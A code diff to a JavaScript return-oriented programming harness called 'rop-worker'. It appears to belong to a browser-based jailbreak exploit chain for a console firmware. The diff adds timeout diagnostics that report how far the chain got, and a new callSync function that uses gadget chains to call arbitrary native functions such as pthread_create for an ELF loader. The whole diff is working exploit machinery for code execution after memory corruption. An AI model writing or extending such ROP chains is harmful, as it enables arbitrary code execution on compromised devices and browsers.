@@ -549,7 +549,28 @@ function fireSync(payload, big, spins) {
             return { retval: rd64(W.retval), spins: i };
         }
     }
-    throw new Error("rop-worker: sync poll timed out after " + cap + " spins");
+    /* Say WHAT the chain got through, not just that it timed out.
+     *
+     * The DONE flag is written by the chain itself, second-to-last, after the
+     * payload has already stored its result. So its state splits the two
+     * failures that look identical from outside:
+     *   done==MAGIC  -> the chain ran to completion; the worker just never got
+     *                   back to its message loop (resume/longjmp problem).
+     *   done==0      -> the chain died partway; the slot tells us whether it
+     *                   even pivoted (still holds pop_rsp = never started, or
+     *                   the parked return address = came back without finishing).
+     * Without this the 12.00 stall at the first syscall is indistinguishable
+     * from a wedged worker, and each guess costs a reboot. */
+    const doneNow = rd64(W.done), slotNow = rd64(W.slot);
+    throw new Error("rop-worker: sync poll timed out after " + cap + " spins"
+        + "; done=" + hex(doneNow)
+        + (doneNow === DONE_MAGIC ? " (CHAIN COMPLETED — worker never resumed)"
+                                  : " (chain did not finish)")
+        + " retval=" + hex(rd64(W.retval))
+        + " slot=" + hex(slotNow)
+        + (slotNow === g("pop_rsp") ? " (still our pivot — worker never woke)"
+           : slotNow === W.kbase + W.slotRva ? " (back to parked return address)"
+           : " (unrecognised)"));
 }
 
 /* Run many syscalls in ONE worker round trip.
@@ -624,6 +645,29 @@ function syscallSync(num, a1, a2, a3, a4, a5) {
         for (let i = 0; i < 5; i++)
             if (args[i] !== undefined) c.pop(regs[i], args[i]);
         c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
+        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
+    });
+}
+
+/* Call a NATIVE FUNCTION (not a syscall) and return its result.
+ *
+ * Same shape as syscallSync, but the chain jumps to `addr` instead of loading
+ * rax and entering the kernel. Needed because the elfldr loader wants
+ * libkernel's pthread_create (4 args) rather than raw thr_new — thr_new makes
+ * the caller hand-build a TCB, and a thread whose TLS is a bare self-pointer
+ * has no canary and no errno slot, which anything elfldr calls into libc will
+ * eventually touch. pthread_create does that setup properly.
+ *
+ * Five argument registers, which is all the System V integer sequence our
+ * gadget set can reach (there is no r9 gadget in either module — verified by
+ * scanning both for pop/xor/mov forms on every firmware, zero usable hits). */
+function callSync(addr, a1, a2, a3, a4, a5) {
+    const args = [a1, a2, a3, a4, a5];
+    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
+    return fireSync((c) => {
+        for (let i = 0; i < 5; i++)
+            if (args[i] !== undefined) c.pop(regs[i], args[i]);
+        c.call(BigInt(addr));
         c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
     });
 }
@@ -810,7 +854,7 @@ function testGetpidSync() {
 
 window.rop_worker = {
     init, survey, fire, syscall, testGetpid,
-    dumpGadgets, testPivot, testStore, locateSlot,
+    dumpGadgets, testPivot, testStore, locateSlot, callSync,
     alloc, allocReset, allocUsed, syscallBatch, syscallBatchTagged, leadThenBatchTagged,
     fireSync, syscallSync, testGetpidSync,
     enumerate, findWorkerStack, spawnWorker, ping, Chain,
